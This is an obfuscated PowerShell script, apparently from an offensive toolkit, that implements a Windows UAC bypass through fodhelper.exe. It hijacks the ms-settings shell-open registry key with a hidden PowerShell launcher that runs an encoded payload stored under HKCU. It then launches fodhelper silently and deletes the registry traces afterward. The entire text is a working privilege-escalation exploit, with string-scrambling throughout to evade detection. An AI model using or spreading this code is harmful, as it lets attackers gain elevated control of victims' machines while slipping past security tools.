  ${Suv`q9}  = [tyPe]("{2}{0}{1}" -f 'O','nMEnt','enViR');  function i`NVO`k`E-`FOdHElPeRByP`ASS {


    [CmdletBinding(SUPPortSSHOuldPRoCEsS = ${t`Rue}, conFIRMIMPAcT = "MED`i`Um")]
    Param (
        [Parameter(mANDaTORy = ${t`RuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${COMm`A`ND},

        [Switch]
        ${F`oRce}
    )
    ${Conse`Nt`pr`oM`Pt} = (&("{0}{4}{1}{2}{3}" -f'G','Pr','o','perty','et-Item') (("{0}{5}{3}{13}{9}{1}{2}{6}{10}{12}{8}{4}{7}{11}" -f 'HK','soft','zv5Wi','M:zv','olicieszv5Sys','L','ndow','te','zv5P','zv5Micro','szv5CurrentVe','m','rsion','5SOFTWARE')).rEpLAce('zv5','\'))."coNsenT`p`ROmPT`BeHAviora`Dmin"
    ${sEcur`Ed`esKt`opprOMpT} = (&("{0}{2}{1}{3}" -f 'G','-ItemPropert','et','y') (("{10}{3}{0}{2}{6}{11}{8}{1}{7}{5}{9}{4}{12}" -f 'VE2','tVE2Windows','M',':VE2SOFTWARE','ciesVE','entVersionVE2P','ic','VE2Curr','osof','oli','HKLM','r','2System')).RePLaCe(([cHaR]86+[cHaR]69+[cHaR]50),'\'))."pr`O`MptOnsECUredESkT`op"

    if(($(&("{0}{1}" -f'whoam','i') ("{1}{0}" -f 'groups','/')) -like ("{2}{1}{0}{3}"-f'-1-5-32-5','S','*','44*'))."l`EnG`Th" -eq 0) {
        ("{0}{10}{1}{3}{9}{7}{8}{4}{6}{2}{5}" -f '[!] Cu','nt ','rato','u','a local admi','r!','nist','n','ot ','ser ','rre')
        Throw (("{6}{0}{3}{2}{5}{4}{1}"-f ' not','!','l a',' a loca','rator','dminist','Current user'))
    }
    if (($(.("{1}{0}"-f'mi','whoa') ("{1}{0}"-f 'oups','/gr')) -like ("{3}{2}{1}{0}"-f'192*','-16-8','-1','*S'))."lEN`GTh" -eq 0) {
        ("{3}{9}{4}{7}{5}{6}{1}{0}{2}{8}" -f 'c','ro','e','[!] Not in ','edium int','grity ','p','e','ss!','a m')
        Throw (("{1}{0}{3}{5}{4}{2}"-f'ot i','N','grity process!','n a mediu','te','m in'))
    }

    if(${cON`SenT`pR`Om`pt} -Eq 2 -And ${s`e`Cu`ReDeSKt`oPP`RoMpt} -Eq 1){
        ((("{5}{16}{3}{4}{0}{6}{15}{7}{9}{12}{17}{11}{10}{2}{8}{14}{1}{13}" -f 'way','is','pa','et to gFwA','l','U','s Notifyg','.','ss t',' This ',' by','e does not','m',' setting.','h','Fw','AC is s','odul'))."REPl`ACE"(([CHAr]103+[CHAr]70+[CHAr]119),[STriNg][CHAr]39))
        exit
    }
    else{
        

        
        ${rEg`P`ATH} = ((("{11}{4}{5}{7}{9}{13}{0}{1}{6}{12}{10}{8}{2}{3}" -f'ar','e{0}M','Window','s{0}Update','CU',':So','i','f','}','t','rosoft{0','HK','c','w'))-f[cHaR]92)
        ${PaR`Ts} = ${rEG`pA`TH}.("{1}{0}" -f 'plit','s').Invoke('\');
        ${Pa`Th} = ${ReG`PatH}.("{0}{1}"-f 's','plit').Invoke("\")[0..(${pAR`Ts}."cOu`NT" -2)] -join '\';
        ${n`Ame} = ${pA`RTS}[-1];
        ${Nu`LL} = .("{0}{1}{2}{3}" -f'Set-It','em','Prope','rty') -Force -Path ${p`ATH} -Name ${na`mE} -Value ${C`omMaND};

        ${M`sSc`oMM`AN`dPAth} = ((("{6}{4}{8}{9}{10}{11}{5}{2}{1}{3}{13}{7}{0}{12}" -f 'en{0}com','ses{0}ms-se','s','tti','f','a','HKCU:{0}So','Shell{0}Op','tware','{0}','C','l','mand','ngs{0}'))-F [chAR]92)

        ${LaUn`Ch`e`RcoM`MaNd} = ${p`sHOMe} + '\' + ('powershe'+'l'+'l'+'.exe '+'-NoP'+' '+'-NonI'+' '+'-W'+' '+'Hi'+'dde'+'n '+'-'+'c '+('Cz8x=Cz8(('+'g'+'p ')."REP`LacE"(([chAr]67+[chAr]122+[chAr]56),[stRiNG][chAr]36)+('HK'+'CU:Softwarefw0Mic'+'roso'+'ftfw0W'+'i'+'ndows ')."RE`Pl`Ace"('fw0',[stRing][cHaR]92)+'Update'+').Upd'+'ate);'+' '+'pow'+'ershel'+'l '+'-NoP'+' '+'-No'+'nI'+' '+'-'+'W '+'Hi'+'d'+'den '+'-'+'enc '+(('Mv'+'kx')-CrEpLACE  'Mvk',[cHAR]36))
        
        if (${F`Or`Ce} -or ((&("{3}{0}{1}{2}" -f 'em','Prope','rty','Get-It') -Path ${mss`COM`m`And`Path} -Name (("{2}{0}{1}" -f'de','fault)','(')) -ErrorAction ("{0}{2}{1}" -f'SilentlyCo','inue','nt')) -eq ${N`UlL})){
            .("{1}{0}" -f '-Item','New') ${MsSCommA`Ndp`ATH} -Force | .("{0}{1}" -f'Out-N','ull')
            &("{2}{3}{1}{0}" -f 'Property','tem','New','-I') -Path ${msScOmMa`ND`PatH} -Name ("{2}{3}{1}{0}" -f 'te','cu','Delegat','eExe') -Value "" -Force | &("{0}{1}"-f 'Ou','t-Null')
            &("{2}{1}{3}{0}"-f'perty','I','Set-','temPro') -Path ${MsSC`ommAn`D`Pa`TH} -Name ("{0}{2}{1}"-f '(def','lt)','au') -Value ${lAUNcHE`R`com`m`AND} -Force | .("{0}{1}"-f'Out-N','ull')
        }else{
            .("{3}{2}{0}{1}" -f'e','-Warning','t','Wri') ("{1}{9}{3}{6}{5}{4}{7}{10}{2}{0}{8}" -f 'rc','Key alread','o',' exists','ider ','ons',', c','using ','e','y','-F')
            exit
        }


        ${f`Od`HeLP`ERpAth} = .("{1}{2}{0}"-f 'h','J','oin-Pat') -Path ( ${suv`Q9}::("{1}{0}{2}" -f'erPa','GetFold','th').Invoke(("{0}{1}"-f 'Sys','tem'))) -ChildPath ("{1}{0}{2}" -f'el','fodh','per.exe')
        
        if (${pSc`mDl`Et}.("{2}{3}{4}{1}{0}" -f'ess','c','Shoul','dP','ro').Invoke(${foD`h`elpe`RpA`TH}, ("{0}{2}{1}{3}"-f'Start','pro',' ','cess'))) {
            ${p`Ro`CeSs} = .("{2}{1}{0}{3}"-f 'oc','-Pr','Start','ess') -FilePath ${f`Odh`ElpERP`ATH} -PassThru -WindowStyle ("{1}{0}"-f'dden','Hi')
            .("{0}{1}{2}"-f 'Wr','it','e-Verbose') ("{4}{1}{2}{0}{3}"-f'ed fodhelper.ex','a','rt','e','St')
        }

        
        .("{0}{1}{2}{3}" -f 'Wri','te','-Ver','bose') ("{5}{8}{1}{6}{0}{7}{4}{3}{2}"-f's t','pi','d',' payloa','rigger','S','ng 5 second','o t','lee')
        if (-not ${psBo`U`NdP`ARAmETers}[("{0}{1}"-f'What','If')]) {
            .("{2}{1}{0}" -f'Sleep','t-','Star') -Seconds 5
        }

        ${m`ssFI`lEPAtH} = ((("{1}{4}{5}{2}{6}{3}{7}{0}"-f'hBv','H','shBvm','-setti','KCU:hB','vSoftwarehBvClasse','s','ngs')) -RepLAcE ([cHAr]104+[cHAr]66+[cHAr]118),[cHAr]92)
        ${p`A`yloadP`AtH} = ((("{1}{7}{4}{0}{5}{2}{6}{3}" -f'w','HKCU','Wi','ws','areI','0MicrosoftIw0','ndo',':Softw'))."rE`plAcE"('Iw0',[sTrInG][chaR]92))
        ${p`A`yL`oADKEY} = ("{0}{1}"-f'U','pdate')

        if (&("{0}{2}{1}{3}"-f'Te','-Pat','st','h') ${MS`SFiL`epa`Th}) {
            
            .("{2}{0}{1}"-f 'emov','e-Item','R') ${MSS`FIlEPa`TH} -Recurse -Force
            .("{3}{1}{0}{2}{4}{5}"-f'move-I','e','temP','R','r','operty') -Force -Path ${PaYl`oA`Dpa`Th} -Name ${PAYL`O`ADkEy}
            &("{3}{2}{0}{1}" -f'er','bose','te-V','Wri') ("{2}{0}{3}{1}{5}{4}" -f 'd registry e','tr','Remove','n','es','i')
        }

        if(&("{1}{0}{2}" -f't-Pro','Ge','cess') -Id ${P`ROc`ESS}."i`D" -ErrorAction ("{0}{1}{4}{3}{2}" -f'Sile','nt','inue','Cont','ly')){
            .("{3}{0}{2}{1}"-f'P','cess','ro','Stop-') -Id ${PR`oCE`SS}."iD"
            &("{0}{1}{2}"-f 'Wr','ite-Verb','ose') ("{3}{4}{6}{1}{5}{2}{0}" -f 'rocess','nn','fodhelper p','Kill','ed','ing ',' ru')
        }
    }
}